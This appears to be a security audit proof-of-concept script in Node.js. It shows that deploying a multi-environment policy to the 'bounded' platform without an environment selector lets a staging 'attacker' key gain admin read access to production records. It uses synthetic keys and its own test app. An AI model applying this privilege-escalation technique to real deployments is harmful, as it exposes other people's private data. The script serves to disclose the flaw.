#!/usr/bin/env node
import { execFileSync } from "node:child_process";
import { createRequire } from "node:module";
import { mkdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";

const monorepo = process.env.BOUNDED_MONOREPO;
if (!monorepo) throw new Error("BOUNDED_MONOREPO is required");
const dev = path.join(monorepo, "dev");
const require = createRequire(path.join(monorepo, "packages/cdk/package.json"));
const { Keypair } = require("@solana/web3.js");
const bs58 = require("bs58").default;
const attackerKeypair = Keypair.generate();
const attackerSecret = bs58.encode(attackerKeypair.secretKey);
const runId = `${Date.now().toString(36)}${Math.floor(Math.random() * 10000)}`;
const cwd = path.join(tmpdir(), `bounded-audit-environment-${runId}`);
mkdirSync(cwd, { recursive: true });
writeFileSync(path.join(cwd, "bounded.json"), JSON.stringify({
  environment: "staging",
  account: { keySource: "profile", profile: "global" }
}));

function bounded(args, actor = "owner") {
  const command = actor === "attacker"
    ? ["env", `BOUNDED_PRIVATE_KEY=${attackerSecret}`, "bounded", ...args]
    : ["bounded", ...args];
  return execFileSync(dev, ["exec", "--", ...command], {
    cwd,
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
    timeout: 240_000
  });
}

const owner = JSON.parse(bounded(["whoami", "--json"]));
const initialPolicy = {
  auth: { wallets: true },
  "privateRecords/$id": {
    fields: { value: "String!" },
    rules: {
      read: "@user.id != null",
      create: "@user.id != null",
      update: "false",
      delete: "false"
    }
  }
};
writeFileSync(path.join(cwd, "initial-policy.json"), `${JSON.stringify(initialPolicy, null, 2)}\n`);
const app = JSON.parse(bounded(["deploy", "initial-policy.json", "--create", "--name", `audit-env-${runId}`.slice(0, 40), "--public", "--json"]));
if (!app.ok || !app.appId) throw new Error("deployment did not return an appId");
bounded(["data", "set", "--app-id", app.appId, "--path", "privateRecords/victim", "--data", JSON.stringify({ value: "victim-production-secret" })]);

const environmentPolicy = {
  auth: { wallets: true },
  environments: {
    staging: { appId: `staging-placeholder-${runId}`, constants: { ADMIN: attackerKeypair.publicKey.toBase58() } },
    production: { appId: app.appId, constants: { ADMIN: owner.address } }
  },
  constants: { ADMIN: attackerKeypair.publicKey.toBase58() },
  roles: { admin: { members: ["@const.ADMIN"], read: "*" } },
  "privateRecords/$id": {
    fields: { value: "String!" },
    rules: { read: "false", create: "false", update: "false", delete: "false" }
  }
};
writeFileSync(path.join(cwd, "environment-policy.json"), `${JSON.stringify(environmentPolicy, null, 2)}\n`);

// This is the dangerous documented default: no policy --environment selector.
bounded(["deploy", "environment-policy.json", "--app-id", app.appId, "--json"]);
const read = JSON.parse(bounded(["data", "get", "--app-id", app.appId, "--path", "privateRecords/victim", "--json"], "attacker"));
const record = read?.data ?? read;
if (record?.value !== "victim-production-secret") {
  throw new Error(`staging principal did not receive production read grant: ${JSON.stringify(read)}`);
}

console.log(JSON.stringify({
  result: "PASS",
  appId: app.appId,
  owner: owner.address,
  stagingPrincipal: attackerKeypair.publicKey.toBase58(),
  bareDeployUsedEnvironmentFlag: false,
  productionRecordReadByStagingPrincipal: record.value
}, null, 2));
